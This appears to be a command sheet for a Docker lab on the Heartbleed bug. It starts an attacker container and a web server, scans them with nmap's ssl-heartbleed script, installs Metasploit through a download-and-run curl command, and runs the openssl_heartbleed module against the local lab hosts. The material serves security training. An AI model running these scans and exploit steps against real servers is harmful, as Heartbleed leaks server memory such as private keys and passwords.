# Start the attacker container image
docker compose run attacker bash
# Or
docker-compose run attacker bash

# Start web server
docker-compose up -d web-server


# Scan heartbleed vulnerability from the attacker container
nmap -sV -p 443 --script=ssl-heartbleed web-server
nmap -sV -p 443 --script=ssl-heartbleed IP-adder-of-web-server

# Scan from local machine not container
sudo nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1


# Install Metasploit on Linux / macOS (AWS Ubuntu)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
# Run Metasploit on Linux / macOS (AWS Ubuntu)
msfconsole
# From there, the program will ask you a couple of questions and will ask for a username and
# password. From there, the program will successfully start and we can get down to business.
# We will input the following to setup our program to target for the Heartbleed bug:
use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS 127.0.0.1
set RPORT 8443
exploit


# Run Metasploit on attacker container
msfconsole

use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS web-server
set RPORT 443
exploit


